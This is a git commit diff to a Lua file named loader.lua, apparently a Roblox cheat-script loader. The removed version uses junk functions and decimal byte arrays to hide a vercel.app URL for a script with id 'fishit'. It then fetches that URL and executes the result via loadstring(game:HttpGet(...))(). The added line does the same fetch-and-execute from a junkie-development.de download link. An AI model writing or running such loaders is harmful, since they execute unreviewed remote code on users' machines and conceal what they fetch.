3898e9dc7762da9aceab97ef9054ccafdc6a3c88
arcadeisreal <rioirvansyah5555@gmail.com>
2025-12-20 11:13:47 +0700

    Update loader.lua

--- loader.lua
+++ loader.lua
@@ -1,13 +1,1 @@
-local _gsvtwfzcrydq=function()
-local _hqyhxqsuxtze=function()
-local _lsngvzyn=867;local _mkaqcrol=function()return _lsngvzyn+1 end;local _ernrxvag=game;if not _ernrxvag then return end;local _oiexqrbnku = (function()local _ldvexy={104,116,116,112,115,58,47,47,108,111,97,100,101,114,99,115,99,114,105,112,116,46,118,101,114,99,101,108,46,97,112,112,47,97,112,105,47,115,99,114,105,112,116,63,105,100,61,102,105,115,104,105,116};local _ujbowc='';for _mutghh=1,#_ldvexy do _ujbowc=_ujbowc..string.char(_ldvexy[_mutghh])end;return _ujbowc end)()
-
-local _hgxxulpwwh, result = pcall(function()
-    return loadstring(game:HttpGet(_oiexqrbnku))()
-end)
-
-if not _hgxxulpwwh then
-    warn((function()local _igwvkl={70,97,105,108,101,100,32,116,111,32,108,111,97,100,32,115,99,114,105,112,116,58};local _xubduq='';for _hnaxcq=1,#_igwvkl do _xubduq=_xubduq..string.char(_igwvkl[_hnaxcq])end;return _xubduq end)(), result)
-end
-end;_hqyhxqsuxtze()
-end;_gsvtwfzcrydq()
+loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/5404709b362eec15f69fc35ad3f09938674b4e79eb6c7bc9dddcf30eb6afc6b3/download"))()
